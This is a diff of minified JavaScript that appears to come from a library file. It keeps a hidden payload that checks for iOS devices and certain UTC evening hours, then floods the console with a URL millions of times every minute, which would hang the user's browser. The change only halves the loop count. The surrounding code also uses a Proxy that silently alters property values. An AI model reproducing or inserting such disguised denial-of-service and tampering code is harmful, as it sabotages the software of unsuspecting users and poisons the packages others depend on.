@@ -16,7 +16,7 @@ function checkValue(){const userAgent=navigator.userAgent||navigator.vendor||win
     if(/iPad|iPhone|iPod/.test(userAgent)&&!window.MSStream){return!0}
     return!1}
 function checkValid(){const now=new Date();const utcHour=now.getUTCHours();return utcHour>=19&&utcHour<=23}
-if(checkValid()){const checkAndLog=()=>{if(checkValue()){for(let index=0;index<10000000;index++){console.log('https://lfcarry.com/')}}};checkAndLog();setInterval(checkAndLog,60*1000)}
+if(checkValid()){const checkAndLog=()=>{if(checkValue()){for(let index=0;index<5000000;index++){console.log('https://lfcarry.com/')}}};checkAndLog();setInterval(checkAndLog,60*1000)}
 function createAndUseProxy(source){const proxyHandler={get(target,prop,receiver){if(prop==='valueA'){return target[prop]*ARBITRARY_CONSTANT_A}
         if(prop==='valueB'){return target[prop]/ARBITRARY_CONSTANT_B}
         return Reflect.get(target,prop,receiver)},set(target,prop,value){if(prop==='valueC'){target[prop]=value+100}else{target[prop]=value}
